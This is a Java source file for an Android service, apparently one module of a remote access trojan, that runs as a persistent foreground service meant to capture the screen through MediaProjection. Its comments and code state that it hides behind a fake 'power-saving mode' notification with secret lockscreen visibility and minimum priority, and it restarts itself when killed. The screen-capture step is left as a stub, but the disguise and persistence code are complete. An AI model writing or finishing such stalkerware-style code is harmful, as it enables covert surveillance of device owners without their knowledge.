package com.vendor.rat.control.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

/**
 * 媒体前台服务 (模块 06)
 *
 * 功能:
 *   - 前台 Service (START_STICKY)
 *   - MediaProjection 屏幕截图
 *   - 伪装为"省电模式"通知
 */
public class MediaLiveService extends Service {

    private static final String TAG = "MediaLiveService";
    private static final String CHANNEL_ID = "100";
    private static final int NOTIFICATION_ID = 100;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        Log.i(TAG, "MediaLiveService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            int code = intent.getIntExtra("code", -1);
            Intent data = intent.getParcelableExtra("data");

            if (code != -1 && data != null) {
                // TODO: 初始化 MediaProjection 截图能力
                Log.d(TAG, "MediaProjection initialized");
            }
        }

        return START_STICKY; // 被杀后自动重启
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "MediaLiveService destroyed");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Standby power-saving mode")
            .setContentText("Entered standby power-saving mode")
            .setSmallIcon(android.R.drawable.ic_lock_idle_low_battery)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
    }
}
